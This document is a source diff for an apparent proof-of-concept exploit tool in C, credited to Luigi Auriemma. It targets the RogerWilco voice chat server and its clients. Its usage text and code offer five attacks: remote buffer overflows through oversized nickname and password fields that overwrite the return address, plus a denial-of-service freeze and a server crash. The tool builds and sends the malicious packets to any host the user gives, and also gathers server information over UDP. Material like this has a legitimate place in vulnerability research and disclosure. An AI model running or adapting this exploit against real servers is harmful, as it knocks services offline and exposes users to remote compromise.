@@ -1,0 +1,654 @@
+/*
+
+by Luigi Auriemma
+
+Use -DWIN to compile it on Windows
+
+UNIX & WIN VERSION
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#ifdef WIN
+#include <winsock.h>
+#include "winerr.h"
+
+#define close closesocket
+#else
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#endif
+
+
+#define VER "0.2"
+#define PORT 3782
+#define UDPORT 32230
+#define BUFFSZ 4096
+#define TIMEOUT 5
+#define CHANNEL "channel"
+
+/* 516 bytes */
+#define BOFNICK \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"AAAA" /* EIP */
+
+/* 33 bytes */
+#define BOF2 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+
+/* 1022 bytes */
+#define BOF3 \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"AAAA" /* EIP */
+
+/* 1268 bytes */
+#define PWDBOF \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+"AAAA" /* EIP */
+
+void rw_manage(int sock, u_char *ptr, int len);
+void info_udp(char *hostname, u_short port);
+void timeout(int sock);
+u_char *create_pck(char *channel, char *password, char *nick, u_short *pcklen);
+void show_dump(unsigned char *buff, unsigned int buffsz);
+void showinfostring(unsigned char *buff, int size);
+u_long resolv(char *host);
+void std_err(void);
+
+u_char bug = 0,
+next = 0; /* 0 = tag, 1 = size, 2 = data */
+u_short type = 0,
+size = 0;
+
+int main(int argc, char *argv[]) {
+u_char *buff = 0,
+*pcksend = 0,
+info = 0,
+autorejoin = 0;
+char *channel = CHANNEL,
+*nick = "",
+*password = 0;
+struct sockaddr_in peer;
+int sd,
+err,
+i,
+len;
+u_short pcklen,
+port = PORT;
+
+setbuf(stdout, NULL);
+
+fputs("\n"
+"Testing tool for RogerWilco "VER"\n"
+"by Luigi Auriemma\n"
+"e-mail: aluigi@pivx.com\n"
+"web: http://aluigi.altervista.org\n"
+"\n", stdout);
+
+
+if(argc < 2) {
+printf("\nUsage: %s [bugs] [options] <host>\n"
+"\nBugs:\n"
+"-1 Remote broadcast BoF in versions 2001 and BoF in 1.4.1.6 (*)\n"
+"-2 DoS to freeze servers, versions 2001 and 1.4.1.6 (*)\n"
+"-3 Server crash in version 1.4.1.6 (*)\n"
+"-4 Buffer-overflow in versions 2001, 1.4.1.2 and 1.4.1.6(*)\n"
+"-5 Server's buffer-overflow versus ALL the graphical clients included\n"
+" the 1.4.1.6 ver and ALL the dedicated servers included the 0.30a\n"
+" version. This bug affets EVERY server also if you don't know its\n"
+" password (you must not set the channel to overwrite the return\n"
+" address with my default value AAAA)\n"
+"Options:\n"
+"-n NICK Chose your nickname (default invisible mode)\n"
+"-c CHAN Chose the channel to join (default \""CHANNEL"\")\n"
+"-w PASS Chose the password for joining the chat (default none)\n"
+"-p PORT Server port to connect to (default 3782) (default info-port 32230)\n"
+"-a Autorejoin immediately if kicked\n"
+"-i Retrieve info from the remote server using UDP (if not hidden)\n"
+"\n\n"
+"(*) These bugs affect the graphical server (not the dedicated server) and if\n"
+" the server is dedicated, all the clients connected are vulnerable\n"
+" This exploit, without using any of these bugs'options, runs like a sniffer\n"
+" and shows you some useful informations\n"
+"\n", argv[0]);
+exit(1);
+}
+
+
+argc--;
+for(i = 1; i < argc; i++) {
+switch(argv[i][1]) {
+case '1':
+case '2':
+case '3':
+case '4':
+case '5': bug = argv[i][1] - 0x30; break;
+case 'n': nick = argv[++i]; break;
+case 'c': channel = argv[++i]; break;
+case 'w': password = argv[++i]; break;
+case 'p': port = atoi(argv[++i]); break;
+case 'a': autorejoin = 1; break;
+case 'i': info = 1; break;
+default: {
+printf("\nError: wrong argument (%s)\n", argv[i]);
+exit(1);
+}
+}
+}
+
+#ifdef WIN
+WSADATA wsadata;
+WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+if(info) {
+if(port == PORT) port = UDPORT;
+info_udp(argv[argc], port);
+return(0);
+}
+
+printf("\n"
+"Nickname: %s\n"
+"Channel: %s\n"
+"\n", nick, channel);
+
+peer.sin_addr.s_addr = resolv(argv[argc]);
+peer.sin_port = htons(port);
+peer.sin_family = AF_INET;
+
+buff = malloc(BUFFSZ + 1);
+if(!buff) std_err();
+
+
+/* AUTOREJOIN */
+while(1) {
+
+sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+if(sd < 0) std_err();
+
+
+printf("\nConnecting to %s:%hu\n",
+inet_ntoa(peer.sin_addr),
+htons(peer.sin_port));
+
+err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
+if(err < 0) std_err();
+
+
+/* BUG 5 */
+if(bug == 5) password = PWDBOF;
+
+pcksend = create_pck(channel, password, nick, &pcklen);
+err = send(sd, pcksend, pcklen, 0);
+if(err < 0) std_err();
+
+next = 0;
+while(1) {
+len = recv(sd, buff, BUFFSZ, 0);
+if(len < 0) std_err();
+if(!len) {
+fputs("\nError: Connection lost\n", stdout);
+break;
+}
+
+rw_manage(sd, buff, len);
+}
+
+close(sd);
+
+if(!autorejoin) break;
+}
+
+return(0);
+}
+
+void rw_manage(int sock, u_char *ptr, int len) {
+int err;
+u_long ip;
+u_short port;
+
+
+while(len > 0) { /* while */
+
+switch(next) {
+/* 0 */ case 0: {
+type = *(u_short *)ptr;
+next = 0;
+switch(type) {
+case 0x030f: {
+fputs("You have been kicked out\n", stdout);
+} break;
+case 0x060f: {
+fputs("The channel you want to join doesn't exist!\n", stdout);
+} break;
+case 0x070f: {
+fputs("The channel requires a password or your password is wrong\n", stdout);
+} break;
+case 0x140f: {
+err = send(sock, "\x0f\x14", 2, 0);
+if(err < 0) std_err();
+} break;
+case 0x150f: {
+err = send(sock, "\x0f\x15", 2, 0);
+if(err < 0) std_err();
+} break;
+default: next = 1; break;
+}
+ptr += 2;
+len -= 2;
+} break; 
+/* 1 */ case 1: {
+size = htons(*(u_short *)ptr);
+next = 2;
+ptr += 2;
+len -= 2;
+} break;
+/* 2 */ case 2: {
+switch(type) {
+case 0x020f: {
+printf("You have ID %hu\n", htons(*(u_short *)ptr));
+} break;
+case 0x0a0f: {
+printf("User with ID %hu is entered\n", htons(*(u_short *)ptr));
+} break;
+case 0x0b0f: {
+printf("User with ID %hu is exited\n", htons(*(u_short *)ptr));
+} break;
+case 0x0c0f: {
+err = size - 2;
+printf("User with ID %hu has name: ", htons(*(u_short *)ptr));
+fwrite(ptr + 2, err, 1, stdout);
+fputc('\n', stdout);
+} break;
+case 0x0d0f:
+case 0x0e0f: {
+/* BOH???
+printf("%hu - %d\n",
+htons(*(u_short *)ptr), htonl(*(u_long *)(ptr + 2)));
+*/
+} break;
+case 0x0f0f: {
+ip = *(u_long *)(ptr + 2);
+port = *(u_short *)(ptr + 6);
+printf("Address of user with ID %hu is %s:%hu\n",
+htons(*(u_short *)ptr),
+inet_ntoa(*(struct in_addr *)&ip),
+htons(port));
+} break;
+default: {
+printf("--> Undefined type: %04x (hex dump follows)\n", type);
+show_dump(ptr, size);
+} break;
+}
+next = 0;
+ptr += size;
+len -= size;
+} break;
+}
+
+} /* while */
+}
+
+void info_udp(char *hostname, u_short port) {
+struct sockaddr_in peer;
+int sd,
+err,
+peerlen;
+u_char *buff;
+
+peer.sin_addr.s_addr = resolv(hostname);
+peer.sin_port = htons(port);
+peer.sin_family = AF_INET;
+peerlen = sizeof(peer);
+
+printf("\nRetrieve information from: %s:%d\n\n",
+inet_ntoa(peer.sin_addr), port);
+
+
+sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+if(sd < 0) std_err();
+
+
+err = sendto(sd, "\\status\\", 8, 0, (struct sockaddr *)&peer, peerlen);
+if(err < 0) std_err();
+
+timeout(sd);
+
+
+buff = malloc(BUFFSZ + 1);
+if(!buff) std_err();
+
+err = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &peerlen);
+if(err < 0) std_err();
+buff[err] = 0x00;
+
+showinfostring(buff, err);
+
+close(sd);
+free(buff);
+}
+
+u_char *create_pck(char *channel, char *password, char *nick, u_short *pcklen) {
+static u_char *buff;
+u_char *ptr;
+u_short len,
+tmp,
+pwlen = 0,
+chlen,
+nicklen;
+
+buff = malloc(BUFFSZ);
+if(!buff) std_err();
+
+ptr = buff;
+
+chlen = strlen(channel) + 1;
+if(password) pwlen = strlen(password);
+
+len = chlen + pwlen + 12;
+tmp = htons(len);
+
+memcpy(ptr, "\x0f\x00", 2);
+ptr += 2;
+memcpy(ptr, &tmp, 2);
+ptr += 2;
+
+/* I dunno what the following 12 bytes are, but they work fine */
+memcpy(ptr, "\x6A\xD6\x4C\x03\x96\xED\x3B\xE7\x88\xE2\xA9\x74", 12);
+ptr += 12;
+memcpy(ptr, channel, chlen);
+ptr += chlen;
+
+if(password) {
+memcpy(ptr, password, pwlen);
+ptr += pwlen;
+}
+
+memcpy(ptr, "\x0F\x10", 2);
+ptr += 2;
+
+switch(bug) {
+case 1: nick = BOFNICK; break;
+case 2: {
+*pcklen = ptr - buff;
+return(buff);
+} break;
+case 3: nick = BOF2; break;
+case 4: nick = BOF3; break;
+default: break;
+}
+
+nicklen = strlen(nick);
+tmp = htons(nicklen);
+memcpy(ptr, &tmp, 2);
+ptr += 2;
+memcpy(ptr, nick, nicklen);
+ptr += nicklen;
+
+memcpy(ptr,
+"\x0F\x11"
+"\x00\x04" "\x00\x00\x00\x02"
+"\x0F\x12"
+"\x00\x04" "\x00\x00\x00\x00", 16);
+
+*pcklen = ptr - buff + 16;
+
+return(buff);
+}
+
+void show_dump(unsigned char *buff, unsigned int buffsz) {
+const char *hex = "0123456789abcdef";
+unsigned char buffout[80],
+*ptrout,
+*ptr;
+unsigned int num;
+int i,
+j,
+rest;
+
+num = buffsz >> 4; /* 16 caratteri */
+rest = (buffsz - (num << 4));
+ptr = buff;
+
+
+for(i = 0; i < num; i++) {
+ptrout = buffout;
+for(j = 0; j < 16; j++) {
+*ptrout++ = hex[*ptr >> 4];
+*ptrout++ = hex[*ptr & 0xf];
+*ptrout++ = 0x20;
+*ptr++;
+}
+*ptrout++ = 0x20;
+*ptrout++ = 0x20;
+
+ptr -= 16;
+for(j = 0; j < 16; j++) {
+if(*ptr > 0x20) *ptrout = *ptr;
+else *ptrout = '.';
+ptr++;
+ptrout++;
+}
+*ptrout++ = 0x0a;
+*ptrout = 0x00;
+fputs(buffout, stdout);
+}
+
+if(rest) {
+ptrout = buffout;
+for(j = 0; j < rest; j++) {
+*ptrout++ = hex[*ptr >> 4];
+*ptrout++ = hex[*ptr & 0xf];
+*ptrout++ = 0x20;
+*ptr++;
+}
+
+j = 50 - (ptrout - buffout);
+memset(ptrout, 0x20, j);
+ptrout += j;
+
+ptr -= rest;
+for(j = 0; j < rest; j++) {
+if(*ptr > 0x20) *ptrout = *ptr;
+else *ptrout = '.';
+ptr++;
+ptrout++;
+}
+*ptrout++ = 0x0a;
+*ptrout = 0x00;
+fputs(buffout, stdout);
+}
+}
+
+u_long resolv(char *host) {
+struct hostent *hp;
+u_long host_ip;
+
+host_ip = inet_addr(host);
+if(host_ip == INADDR_NONE) {
+hp = gethostbyname(host);
+if(!hp) {
+printf("\nError: Unable to resolve hostname (%s)\n",
+host);
+exit(1);
+} else host_ip = *(u_long *)(hp->h_addr);
+}
+
+return(host_ip);
+}
+
+void timeout(int sock) {
+struct timeval timeout;
+fd_set fd_read;
+int err;
+
+
+timeout.tv_sec = TIMEOUT;
+timeout.tv_usec = 0;
+
+FD_ZERO(&fd_read);
+FD_SET(sock, &fd_read);
+err = select(sock + 1, &fd_read, NULL, NULL, &timeout);
+if(err < 0) std_err();
+if(!err) {
+fputs("\nError: Socket timeout, no answers received\n", stdout);
+exit(1);
+}
+}
+
+void showinfostring(unsigned char *buff, int size) {
+int nt = 1;
+// int len;
+u_char *string;
+
+
+// len = strlen(buff);
+// if(len < size) buff += len + 1;
+
+while(1) {
+string = strchr(buff, '\\');
+if(!string) break;
+
+*string = 0x00;
+
+
+/* \n or \t */
+if(!nt) {
+printf("%s: ", buff);
+nt++;
+} else {
+printf("%s\n", buff);
+nt = 0;
+}
+
+
+buff = string + 1;
+}
+
+printf("%s\n\n", buff);
+}
+
+#ifndef WIN
+void std_err(void) {
+perror("\nError");
+exit(1);
+}
+#endif
+
+------------------------------ winerr.h ------------------------------
+/*
+Header file used for manage errors in Windows
+It support socket and errno too
+(this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+char *error;
+
+switch(WSAGetLastError()) {
+case 10004: error = "Interrupted system call"; break;
+case 10009: error = "Bad file number"; break;
+case 10013: error = "Permission denied"; break;
+case 10014: error = "Bad address"; break;
+case 10022: error = "Invalid argument (not bind)"; break;
+case 10024: error = "Too many open files"; break;
+case 10035: error = "Operation would block"; break;
+case 10036: error = "Operation now in progress"; break;
+case 10037: error = "Operation already in progress"; break;
+case 10038: error = "Socket operation on non-socket"; break;
+case 10039: error = "Destination address required"; break;
+case 10040: error = "Message too long"; break;
+case 10041: error = "Protocol wrong type for socket"; break;
+case 10042: error = "Bad protocol option"; break;
+case 10043: error = "Protocol not supported"; break;
+case 10044: error = "Socket type not supported"; break;
+case 10045: error = "Operation not supported on socket"; break;
+case 10046: error = "Protocol family not supported"; break;
+case 10047: error = "Address family not supported by protocol family"; break;
+case 10048: error = "Address already in use"; break;
+case 10049: error = "Can't assign requested address"; break;
+case 10050: error = "Network is down"; break;
+case 10051: error = "Network is unreachable"; break;
+case 10052: error = "Net dropped connection or reset"; break;
+case 10053: error = "Software caused connection abort"; break;
+case 10054: error = "Connection reset by peer"; break;
+case 10055: error = "No buffer space available"; break;
+case 10056: error = "Socket is already connected"; break;
+case 10057: error = "Socket is not connected"; break;
+case 10058: error = "Can't send after socket shutdown"; break;
+case 10059: error = "Too many references, can't splice"; break;
+case 10060: error = "Connection timed out"; break;
+case 10061: error = "Connection refused"; break;
+case 10062: error = "Too many levels of symbolic links"; break;
+case 10063: error = "File name too long"; break;
+case 10064: error = "Host is down"; break;
+case 10065: error = "No Route to Host"; break;
+case 10066: error = "Directory not empty"; break;
+case 10067: error = "Too many processes"; break;
+case 10068: error = "Too many users"; break;
+case 10069: error = "Disc Quota Exceeded"; break;
+case 10070: error = "Stale NFS file handle"; break;
+case 10091: error = "Network SubSystem is unavailable"; break;
+case 10092: error = "WINSOCK DLL Version out of range"; break;
+case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+case 10071: error = "Too many levels of remote in path"; break;
+case 11001: error = "Host not found"; break;
+case 11002: error = "Non-Authoritative Host not found"; break;
+case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+case 11004: error = "Valid name, no data record of requested type"; break;
+default: error = strerror(errno); break;
+}
+fprintf(stderr, "\nError: %s\n", error);
+exit(1);
+}
